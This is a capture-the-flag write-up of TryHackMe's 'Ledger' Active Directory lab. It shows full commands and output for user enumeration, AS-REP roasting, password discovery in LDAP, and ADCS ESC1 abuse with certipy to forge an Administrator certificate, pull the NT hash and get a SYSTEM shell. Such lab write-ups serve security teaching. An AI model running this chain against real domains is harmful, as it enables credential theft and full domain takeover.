# **Ledger - TryHackMe**

*Target Ip. Address: 10.48.156.247*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.49.171.219
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 13:12 +0545
Nmap scan report for 10.49.171.219 (10.49.171.219)
Host is up (0.034s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-23 07:27:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-23T07:29:14+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-02-23T07:14:42
|_Not valid after:  2027-02-23T07:14:42
443/tcp  open  ssl/https?
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
|_ssl-date: 2026-02-23T07:29:14+00:00; +1s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-02-23T07:14:42
|_Not valid after:  2027-02-23T07:14:42
|_ssl-date: 2026-02-23T07:29:14+00:00; +1s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-23T07:29:14+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-02-23T07:14:42
|_Not valid after:  2027-02-23T07:14:42
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-02-23T07:14:42
|_Not valid after:  2027-02-23T07:14:42
|_ssl-date: 2026-02-23T07:29:14+00:00; +1s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-23T07:29:14+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Not valid before: 2026-02-22T07:23:31
|_Not valid after:  2026-08-24T07:23:31
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-23T07:28:08
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.88 seconds
```

We have basic AD services running. Let's add domain name, DNS and certificate name in our hosts file.

```bash
kali@kali:cat /etc/hosts
10.49.171.219   labyrinth.thm.local thm.local thm-LABYRINTH-CA
 
127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Let's see if we have guest/anonymous logon allowed in smb shares.

```bash
kali@kali:smbclient -L \\10.49.171.219
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.49.171.219 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Nothing that can help us here. Since, we have guest logon allowed, let's brute force the usernames.

```bash
kali@kali:impacket-lookupsid labyrinth.thm.local/guest@10.49.171.219
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.49.171.219
[*] StringBinding ncacn_np:10.49.171.219[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1966530601-3185510712-10604624
498: THM\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: THM\Administrator (SidTypeUser)
501: THM\Guest (SidTypeUser)
502: THM\krbtgt (SidTypeUser)
512: THM\Domain Admins (SidTypeGroup)
513: THM\Domain Users (SidTypeGroup)
514: THM\Domain Guests (SidTypeGroup)
515: THM\Domain Computers (SidTypeGroup)
516: THM\Domain Controllers (SidTypeGroup)
517: THM\Cert Publishers (SidTypeAlias)
518: THM\Schema Admins (SidTypeGroup)
519: THM\Enterprise Admins (SidTypeGroup)
520: THM\Group Policy Creator Owners (SidTypeGroup)
521: THM\Read-only Domain Controllers (SidTypeGroup)
522: THM\Cloneable Domain Controllers (SidTypeGroup)
.
.
.
1596: THM\LIONEL_BAILEY (SidTypeUser)
1597: THM\TERRANCE_PRUITT (SidTypeUser)
1598: THM\TAMI_HOBBS (SidTypeUser)
1599: THM\RODOLFO_ASHLEY (SidTypeUser)
1600: THM\PAULETTE_HEAD (SidTypeUser)
1601: THM\DARRIN_HOLMES (SidTypeUser)
1602: THM\JANET_WALLS (SidTypeUser)
1603: THM\ELVIRA_PITTMAN (SidTypeUser)
```

We have lot's of usernames, let's try AS-REP roasting to see if we can get some hashes from this long list of users.

```bash
kali@kali:impacket-GetNPUsers thm.local/ -usersfile users.txt -format hashcat -dc-ip 10.49.171.219 -no-pass | grep '$krb5asrep'
$krb5asrep$23$SHELLEY_BEARD@THM.LOCAL:9a461e935.....9d70364
$krb5asrep$23$ISIAH_WALKER@THM.LOCAL:d5707d8.....a667367a
$krb5asrep$23$QUEEN_GARNER@THM.LOCAL:a5744ed562.....50ed43d5
$krb5asrep$23$PHYLLIS_MCCOY@THM.LOCAL:b66901.....558f9456
$krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:b0008a.....460ff80f
```

We get hashes for 5 users. Let's crack them using john the ripper.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:49 DONE (2026-02-23 13:42) 0g/s 287162p/s 1435Kc/s 1435KC/s  0841079575..*7¡Vamos!
Session completed.
```

That was unsuccessful. It seems we fell into the rabbit hole. Let's move towards enumerating LDAP.

```bash
ldapsearch -x -H ldap://10.49.171.219 -b "dc=thm,dc=local" > misc.txt
```

<img width="679" height="551" alt="Screenshot 2026-02-23 140515" src="https://github.com/user-attachments/assets/86c9703d-259f-4149-a490-675ab365d4b5" />

<img width="665" height="592" alt="Screenshot 2026-02-23 140537" src="https://github.com/user-attachments/assets/4fe897d2-853f-460e-9bd0-a0213b9f42fa" />

We find credentials for 2 users, the password is same for both. Let's verify them.

```credentials
Credentials:
IVY_WILLIS: CH...3!
SUSANNA_MCKNIGHT:CH...3!
```

```bash
kali@kali:nxc rdp 10.49.171.219 -u 'IVY_WILLIS' 'SUSANNA_MCKNIGHT' -p 'CH...3!' -d thm.local
RDP         10.49.171.219   3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
RDP         10.49.171.219   3389   LABYRINTH        [+] thm.local\IVY_WILLIS:CH...3!
RDP         10.49.171.219   3389   LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CH...3! (Pwn3d!)
```

The password was coorect for both users. Since, SUSANNA_MCKNIGHT can rdp, we will focus on this user.

```bash
kali@kali:xfreerdp3 /u:SUSANNA_MCKNIGHT /p:'CH...3!' /v:10.49.171.219 /d:thm.local /dynamic-resolution /cert:ignore /drive:share,/home/kali/tools            
[14:15:14:513] [58717:0000e55d] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Using /p is insecure
[14:15:14:513] [58717:0000e55d] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Passing credentials or secrets via command line might expose these in the process list
[14:15:14:513] [58717:0000e55d] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Consider using one of the following (more secure) alternatives:
```

<img width="1032" height="799" alt="Screenshot 2026-02-23 141555" src="https://github.com/user-attachments/assets/88e727bb-a1b3-496a-a062-74936cd90fab" />

We get our first flag. Since, we have valid credentials, let's run bloodhound to see if we can map attack path.

```bash
kali@kali:bloodhound-python -u 'SUSANNA_MCKNIGHT' -p 'CH...3!' -d 'thm.local' -dc 'LABYRINTH.thm.local' -ns 10.49.171.219 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: thm.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: LABYRINTH.thm.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: LABYRINTH.thm.local
INFO: Found 493 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 222 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: labyrinth.thm.local
INFO: Done in 00M 17S
```

Loading in the bloodhoud UI, we see no possible attack paths from this user. Let's get back to enumeration.

Since, we saw a certificate during our nmap scan, and it also has port 80/443 open. Many AD CS setups have a web portal for users to request certificates. Let's verify

```bash
kali@kali:nxc ldap 10.49.171.219 -u 'SUSANNA_MCKNIGHT' -p 'CH...3!' -M adcs
LDAP        10.49.171.219   389    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local) (signing:None) (channel binding:Never)
LDAP        10.49.171.219   389    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CH...3!
ADCS        10.49.171.219   389    LABYRINTH        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.49.171.219   389    LABYRINTH        Found PKI Enrollment Server: labyrinth.thm.local
ADCS        10.49.171.219   389    LABYRINTH        Found CN: thm-LABYRINTH-CA
ADCS        10.49.171.219   389    LABYRINTH        Found PKI Enrollment WebService: https://labyrinth.thm.local/thm-LABYRINTH-CA_CES_Certificate/service.svc/CES
```

Well, we were right. It confirms that the ADCS service is active, identified as thm-LABYRINTH-CA, and reachable.

```bash
kali@kali:certipy-ad find -u SUSANNA_MCKNIGHT@local.thm -p 'CH...3!' -dc-ip 10.49.171.219 -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'thm-LABYRINTH-CA' via RRP
[*] Successfully retrieved CA configuration for 'thm-LABYRINTH-CA'
[*] Checking web enrollment for CA 'thm-LABYRINTH-CA' @ 'labyrinth.thm.local'
[*] Saving text output to '20260223142738_Certipy.txt'
[*] Wrote text output to '20260223142738_Certipy.txt'
[*] Saving JSON output to '20260223142738_Certipy.json'
[*] Wrote JSON output to '20260223142738_Certipy.json'
```

```20260223142738_Certipy.json
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "thm-LABYRINTH-CA",
      "DNS Name": "labyrinth.thm.local",
      "Certificate Subject": "CN=thm-LABYRINTH-CA, DC=thm, DC=local",
      "Certificate Serial Number": "5225C02DD750EDB340E984BC75F09029",
      "Certificate Validity Start": "2023-05-12 07:26:00+00:00",
      "Certificate Validity End": "2028-05-12 07:35:59+00:00",
      "Web Enrollment": {
        "http": {
          "enabled": false
        },
        "https": {
          "enabled": false,
          "channel_binding": null
        }
      },
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
      "Permissions": {
        "Owner": "THM.LOCAL\\Administrators",
        "Access Rights": {
          "1": [
            "THM.LOCAL\\Administrators",
            "THM.LOCAL\\Domain Admins",
            "THM.LOCAL\\Enterprise Admins"
          ],
          "2": [
            "THM.LOCAL\\Administrators",
            "THM.LOCAL\\Domain Admins",
            "THM.LOCAL\\Enterprise Admins"
          ],
          "512": [
            "THM.LOCAL\\Authenticated Users"
          ]
        }
      }
    }
  },
  "Certificate Templates": {
    "0": {
      "Template Name": "ServerAuth",
      "Display Name": "ServerAuth",
      "Certificate Authorities": [
        "thm-LABYRINTH-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
        1
      ],
      "Extended Key Usage": [
        "Client Authentication",
        "Server Authentication"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Schema Version": 2,
      "Validity Period": "1 year",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Template Created": "2023-05-12 08:55:40+00:00",
      "Template Last Modified": "2023-05-12 08:55:40+00:00",
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "THM.LOCAL\\Domain Admins",
            "THM.LOCAL\\Domain Computers",
            "THM.LOCAL\\Enterprise Admins",
            "THM.LOCAL\\Authenticated Users"
          ]
        },
        "Object Control Permissions": {
          "Owner": "THM.LOCAL\\Administrator",
          "Full Control Principals": [
            "THM.LOCAL\\Domain Admins",
            "THM.LOCAL\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "THM.LOCAL\\Domain Admins",
            "THM.LOCAL\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "THM.LOCAL\\Domain Admins",
            "THM.LOCAL\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "THM.LOCAL\\Domain Admins",
            "THM.LOCAL\\Domain Computers",
            "THM.LOCAL\\Enterprise Admins"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "THM.LOCAL\\Authenticated Users",
        "THM.LOCAL\\Domain Computers"
      ],
      "[!] Vulnerabilities": {
        "ESC1": "Enrollee supplies subject and template allows client authentication."
      }
    }
  }
}
```

**Vulnerability: ESC1 (Requestor Supplies Subject)**

This is the most direct path to Domain Admin. The ServerAuth template is misconfigured in three specific ways that create a perfect storm:

1. Enrollee Supplies Subject: true: This means when you request a certificate, you can tell the CA, "I am the Administrator," and the CA will believe you.

2. Client Authentication: true: The resulting certificate can be used to log into the domain (Kerberos/NTLM authentication).

3. Enrollment Rights: THM.LOCAL\Authenticated Users: Every single user in the domain (including SUSANNA_MCKNIGHT or even a low-priv account) can request this certificate.

Let's get moving. We will now request the certificate for administrator.

```bash
kali@kali:certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password 'CH...3!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn Administrator@thm.local
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: labyrinth.thm.local.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: THM.LOCAL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 25
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@thm.local'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

We got the administrator certificate, let's abuse that to get administrator hash.

```bash
kali@kali:certipy-ad auth -pfx administrator.pfx -dc-ip 10.49.171.219
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@thm.local'
[*] Using principal: 'administrator@thm.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:07.....32
```

That was successfull. While running certipy-ad, timeout might occur. Just run again. It should be successful. We have everything we need, let's login as Administrator.

```bash
kali@kali:impacket-smbexec -k -hashes :07.....22 thm.local/Administrator@labyrinth.thm.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

We are NT authority/sytem. That's game over. Let's end challenge by reading the final flag.

```bash
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
THM{TH.....D!}
```
